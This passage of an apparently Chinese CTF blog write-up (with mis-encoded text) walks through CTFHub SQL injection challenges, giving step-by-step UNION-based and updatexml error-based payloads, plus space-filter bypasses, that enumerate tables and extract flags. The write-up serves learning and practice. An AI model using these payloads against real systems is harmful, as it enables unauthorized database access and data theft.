class="hljs-number">1</span>,database()<br></code></pre></td></tr></table></figure><p>å½“å‰æ•°æ®åº“åä¸ºsqli</p><p>5.çˆ†è¡¨å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">-1</span> union select <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where table_schema=<span class="hljs-string">&#x27;sqli&#x27;</span><br></code></pre></td></tr></table></figure><p>æœ‰ä¸¤ä¸ªè¡¨ï¼Œä¸€ä¸ªæ˜¯newsï¼Œå¦å¤–ä¸€ä¸ªæ˜¯flag</p><p>6.çˆ†å­—æ®µå</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">-1</span> union select <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where table_schema=<span class="hljs-string">&#x27;sqli&#x27;</span> <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">&#x27;flag&#x27;</span><br></code></pre></td></tr></table></figure><p>å­—æ®µåä¸ºflag</p><p>7.çˆ†å€¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload1: ?id=<span class="hljs-number">-1</span> union select <span class="hljs-number">1</span>,group_concat(flag) <span class="hljs-keyword">from</span> flag<br>Payload2: ?id=<span class="hljs-number">-1</span> union select <span class="hljs-number">1</span>,flag <span class="hljs-keyword">from</span> flag<br></code></pre></td></tr></table></figure><h2 id="å­—ç¬¦å‹æ³¨å…¥"><a href="#å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="å­—ç¬¦å‹æ³¨å…¥"></a>å­—ç¬¦å‹æ³¨å…¥</h2><p>è¾“å…¥1ï¼Œå‘ç°sqlè¯­å¥æ•°å­—ä¸­æˆ‘ä»¬è¾“å…¥çš„1è¢«å•å¼•å·åŒ…è£¹ï¼Œå­—ç¬¦å‹æ³¨å…¥è·Ÿæ•°å­—å‹æ³¨å…¥çš„åŒºåˆ«å°±åœ¨äºå¼•å·çš„é—­åˆ<br><img src="https://img-blog.csdnimg.cn/20201114185956833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>1.åˆ¤æ–­æ³¨å…¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; è¿”å›é”™è¯¯</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;1 æ­£å¸¸å›æ˜¾</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;2 è¿”å›é”™è¯¯</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>   è¿”å›é”™è¯¯ï¼Œéœ€åŠ æ³¨é‡Šç¬¦å·<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=1#  æ­£å¸¸å›æ˜¾</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>#  è¿”å›é”™è¯¯<br></code></pre></td></tr></table></figure><p>å¯ä»¥åˆ¤æ–­ä¸ºå­—ç¬¦å‹æ³¨å…¥</p><p>2.åˆ¤æ–­å­—æ®µæ•°</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 1 #   å›æ˜¾æ­£å¸¸</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span> #   å›æ˜¾æ­£å¸¸<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 3 #   è¿”å›é”™è¯¯</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å­—æ®µæ•°ä¸º2</p><p>3.è”åˆæŸ¥è¯¢</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=2 union select 1,2#  å›æ˜¾æ­£å¸¸</span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>#         å›æ˜¾æ­£å¸¸<br><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3#       è¿”å›é”™è¯¯</span><br></code></pre></td></tr></table></figure><p>å›æ˜¾ç‚¹ä½æ˜¯2å’Œ3</p><p>3.çˆ†æ•°æ®åº“åï¼Œå¾—åˆ°æ•°æ®åº“åsqli</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,database()#</span><br></code></pre></td></tr></table></figure><p>4.çˆ†è¡¨åï¼Œå¾—åˆ°ä¸¤ä¸ªè¡¨å news,flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>sqli<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure><p>5.çˆ†å­—æ®µåï¼Œå­—æ®µåflag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure><p>6.çˆ†å€¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(flag) from flag#</span><br></code></pre></td></tr></table></figure><h2 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h2><p>ç™¾åº¦äº†ä¸€ä¸‹æŠ¥é”™æ³¨å…¥ï¼ŒæŠ¥é”™æ³¨å…¥æ˜¯æˆ‘ä»¬é€šè¿‡åé¦ˆå‡ºæ¥çš„é”™è¯¯æ¥è·å–åˆ°æˆ‘ä»¬æ‰€éœ€è¦çš„ä¿¡æ¯ï¼Œå‘ç°ä¸€å…±æœ‰<a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html">åç§æŠ¥é”™æ³¨å…¥</a>ï¼Œæœ€å¸¸ç”¨åˆ°çš„ä¸‰ç§æŠ¥é”™æ³¨å…¥æ–¹å¼åˆ†åˆ«æ˜¯ï¼š<code>updatexml()</code>ã€<code>floor()</code>ã€<code>extractvalue()</code>ã€‚<br>å¤ªèœäº†ï¼Œçœ‹äº†ä¸‹å¤§å¸ˆå‚…ä»¬çš„wpï¼Œå‘ç°è¿™é“é¢˜å°±æ˜¯åˆ©ç”¨<code>updatexml()</code>å‡½æ•°è¿›è¡ŒæŠ¥é”™æ³¨å…¥</p><p><a href="https://www.cnblogs.com/0daybug/p/12334557.html">updatexml()è¯­æ³•ï¼š</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">UPDATEXML (XML_document, XPath_string, new_value);<br></code></pre></td></tr></table></figure><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>XML_document</td><td>XML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc</td></tr><tr><td>XPath_string</td><td>XPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ï¼ŒxpathæŠ¥é”™åªæ˜¾ç¤º32ä½ç»“æœ</td></tr><tr><td>new_value</td><td>new_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®</td></tr></tbody></table><p><strong>updatexmlçš„æŠ¥é”™åŸç†</strong>ï¼š</p><blockquote><p>updatexmlç¬¬äºŒä¸ªå‚æ•°éœ€è¦çš„æ˜¯Xpathæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œä½†æ˜¯æˆ‘ä»¬ç¬¬äºŒä¸ªå‚æ•°å¾ˆæ˜æ˜¾ä¸æ˜¯ï¼Œè€Œæ˜¯æˆ‘ä»¬æƒ³è¦è·å¾—çš„æ•°æ®ï¼Œæ‰€ä»¥ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”åœ¨æŠ¥é”™çš„æ—¶å€™ä¼šå°†å…¶å†…å®¹æ˜¾ç¤ºå‡ºæ¥ï¼Œä»è€Œè·å¾—æˆ‘ä»¬æƒ³è¦çš„æ•°æ®ã€‚</p></blockquote><p>ä½¿ç”¨updatexmlæŠ¥é”™æ³¨å…¥å›ºå®šæ ¼å¼ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">payloadï¼š?id=a<span class="hljs-string">&#x27;and(updatexml(&quot;anything&quot;,concat(&#x27;</span>~<span class="hljs-string">&#x27;,(selectè¯­å¥())),&quot;anything&quot;))</span><br></code></pre></td></tr></table></figure><p><code>concat()</code>å‡½æ•°å°†å…¶è¿æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå› æ­¤ä¸ä¼šç¬¦åˆXPATH_stringçš„æ ¼å¼ï¼Œä»è€Œå‡ºç°æ ¼å¼é”™è¯¯ï¼Œçˆ†å‡ºæƒ³è¦çš„æ•°æ®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select user()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114214226330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>çˆ†åº“åï¼ŒæŸ¥åˆ°æ•°æ®åº“åä¸ºsqli</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select database()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114205812885.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>çˆ†å­—æ®µï¼Œä¸€ä¸ªnewsï¼Œä¸€ä¸ªflag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where table_schema=<span class="hljs-string">&#x27;sqli&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114205926889.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>çˆ†å­—æ®µåï¼Œå­—æ®µåä¸ºflag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where table_name=<span class="hljs-string">&#x27;flag&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114210012894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>çˆ†å€¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select group_concat(flag) <span class="hljs-keyword">from</span> flag),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114205438234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¥½åƒåªæœ‰ä¸€éƒ¨åˆ†flagï¼Œè¿™ä¸ªæ—¶å€™å°±ç”¨åˆ°äº†<code>mid()</code>å‡½æ•°<br><img src="https://img-blog.csdnimg.cn/20201114213929117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä½¿ç”¨midå‡½æ•°æ¥è¿›è¡Œå­—ç¬¦æˆªå–,æ¥æ˜¾ç¤ºå¦å¤–ä¸€åŠflagã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,mid((select group_concat(flag) <span class="hljs-keyword">from</span> flag),<span class="hljs-number">32</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114205554257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="MySQLç»“æ„"><a href="#MySQLç»“æ„" class="headerlink" title="MySQLç»“æ„"></a>MySQLç»“æ„</h2><p><img src="https://img-blog.csdnimg.cn/20210127170719344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>1.åˆ¤æ–­æ³¨å…¥ç±»å‹<br>è¾“å…¥1ï¼Œæœ‰å›æ˜¾ï¼›è¾“å…¥1 and 1=1ï¼Œæ­£å¸¸å›æ˜¾ï¼›è¾“å…¥1 and 1=2,  è¿”å›é”™è¯¯ã€‚<br><img src="https://img-blog.csdnimg.cn/2021012717113182.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‰€ä»¥æ˜¯æ•°å­—å‹æ³¨å…¥<br>2.åˆ¤æ–­å›æ˜¾ç‚¹ä½<br>è¾“å…¥<code>1 order by 2</code>æœ‰å›æ˜¾<br><img src="https://img-blog.csdnimg.cn/20210127171405960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¾“å…¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>å›æ˜¾ç‚¹ä½ä¸º1,2<br><img src="https://img-blog.csdnimg.cn/20210127171713726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>3.æŸ¥æ•°æ®åº“å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> database(),<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>æ•°æ®åº“åä¸ºsqli<br><img src="https://img-blog.csdnimg.cn/20210127171630811.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>4.æŸ¥è¡¨</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(table_name),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span><br></code></pre></td></tr></table></figure><p>æœ‰newså’Œnrjduumafrè¡¨<br><img src="https://img-blog.csdnimg.cn/2021012717191096.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>5.æŸ¥å­—æ®µå</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(column_name),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;nrjduumafr&#x27;</span><br></code></pre></td></tr></table></figure><p>å­—æ®µåä¸ºqejxezuixk<br><img src="https://img-blog.csdnimg.cn/20210127172046307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>6.çˆ†å€¼</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> qejxezuixk,<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> nrjduumafr<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127172202287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="è¿‡æ»¤ç©ºæ ¼"><a href="#è¿‡æ»¤ç©ºæ ¼" class="headerlink" title="è¿‡æ»¤ç©ºæ ¼"></a>è¿‡æ»¤ç©ºæ ¼</h2><p>è¾“å…¥1ï¼Œå›æ˜¾ctfhubï¼›è¾“å…¥2ï¼Œå›æ˜¾skillï¼›è¾“å…¥3ï¼Œæ— å›æ˜¾ã€‚<br><img src="https://img-blog.csdnimg.cn/20210127121828345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç»•è¿‡ç©ºæ ¼è¿‡æ»¤çš„æ–¹å¼ï¼š <code>/**/ã€()ã€%0a</code>ã€‚</p><p>ç”¨%0aä»£æ›¿ç©ºæ ¼è¾“å…¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">order</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">by</span><span class="hljs-comment">/**/</span><span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>æœ‰å›æ˜¾<br><img src="https://img-blog.csdnimg.cn/20210127122947660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆ¤æ–­å›æ˜¾ä½</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">Payload: ?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127124529352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æŸ¥æ•°æ®åº“ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">Payload: ?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>database(),<span class="hljs-number">2</span> <br></code></pre></td></tr></table></figure><p> æ•°æ®åº“ä¸ºsqli<img src="https://img-blog.csdnimg.cn/20210127125025284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥è¡¨ ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">Payload: ?id<span class="hljs-operator">=</span> <span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(table_name),<span class="hljs-number">2</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.tables<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span> <br></code></pre></td></tr></table></figure><p>sqliä¸­æœ‰ä¸¤ä¸ªè¡¨ï¼Œåˆ†åˆ«ä¸º rrkdctjwlfå’Œnews<br><img src="https://img-blog.csdnimg.cn/20210127125119950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æŸ¥å­—æ®µï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">Payload: ?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(column_name),<span class="hljs-number">2</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.columns<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;rrkdctjwlf&#x27;</span><br></code></pre></td></tr></table></figure><p>rrkdctjwlfè¡¨ä¸­ï¼Œæœ‰ä¸€ä¸ªå­—æ®µwonevkchnv<br><img src="https://img-blog.csdnimg.cn/20210127125346665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥çœ‹å­—æ®µçš„æ•°æ®ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">Payload: ?id<span class="hljs-operator">=</span> <span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>wonevkchnv,<span class="hljs-number">2</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>rrkdctjwlf<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021012712590372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="Cookieæ³¨å…¥"><a href="#Cookieæ³¨å…¥" class="headerlink" title="Cookieæ³¨å…¥"></a>Cookieæ³¨å…¥</h2><p><img 